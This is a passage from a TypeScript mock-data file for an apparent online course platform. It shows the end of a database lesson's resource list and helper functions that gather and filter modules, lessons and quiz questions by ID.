## Resources

- [Database System Concepts](https://www.db-book.com/)
- [Architecture of a Database System](http://db.cs.berkeley.edu/papers/fntdb07-architecture.pdf)
- [SQLite Source Code](https://www.sqlite.org/src/doc/trunk/README.md)

Time to build the foundation of data! 🗄️`,
    duration_minutes: 300,
    order_index: 1,
    is_published: true,
    created_at: '2024-01-25T09:00:00Z',
    updated_at: '2024-01-25T09:00:00Z',
  },
];

// Combine all mock data
export const getAllMockModules = (): Module[] => [
  ...reactCourseModules,
  ...ctfCourseModules,
  ...ecommerceCourseModules,
  ...makeYourOwnCourseModules,
];

export const getAllMockLessons = (): Lesson[] => [
  ...reactCourseLessons,
  ...ctfCourseLessons,
  ...ecommerceCourseLessons,
  ...makeYourOwnCourseLessons,
];

export const getAllMockQuizQuestions = (): QuizQuestion[] => [
  ...reactQuizQuestions,
];

// Helper functions to get content by course ID
export const getModulesByCourseId = (courseId: string): Module[] => {
  return getAllMockModules().filter(module => module.course_id === courseId);
};

export const getLessonsByModuleId = (moduleId: string): Lesson[] => {
  return getAllMockLessons().filter(lesson => lesson.module_id === moduleId);
};

export const getQuizQuestionsByLessonId = (lessonId: string): QuizQuestion[] => {
  return getAllMockQuizQuestions().filter(question => question.lesson_id === lessonId);
};